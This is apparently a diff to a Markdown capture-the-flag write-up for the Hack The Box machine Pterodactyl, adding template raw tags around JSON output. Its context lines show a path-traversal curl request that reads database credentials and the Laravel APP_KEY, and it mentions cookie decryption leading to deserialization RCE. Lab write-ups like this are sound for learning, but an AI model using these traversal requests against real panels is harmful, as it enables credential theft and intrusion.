@@ -237,6 +237,7 @@ curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterod
 ```
 
 Extracted credentials `pterodactyl:PteraPanel` for database `panel`
+{% raw %}
 ```json
 {
   "../../../pterodactyl": {
@@ -296,6 +297,7 @@ Extracted credentials `pterodactyl:PteraPanel` for database `panel`
   }
 }
 ```
+{% endraw %}
 
 #### Application Key Extraction
 
@@ -306,6 +308,7 @@ The Laravel `APP_KEY` is crucial for cookie encryption/decryption attacks:
 # APP_KEY is used to encrypt Laravel session cookies and can enable deserialization RCE
 curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app' | jq
 ```
+{% raw %}
 ```json
 {
   "../../../pterodactyl": {
@@ -327,6 +330,7 @@ curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterod
   }
 }
 ```
+{% endraw %}
 
 
 This key uses AES-256-CBC cipher for Laravel's encrypted cookies. Copying the cookie pterodactyl's site and decrypting the cookie with [laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer.git):
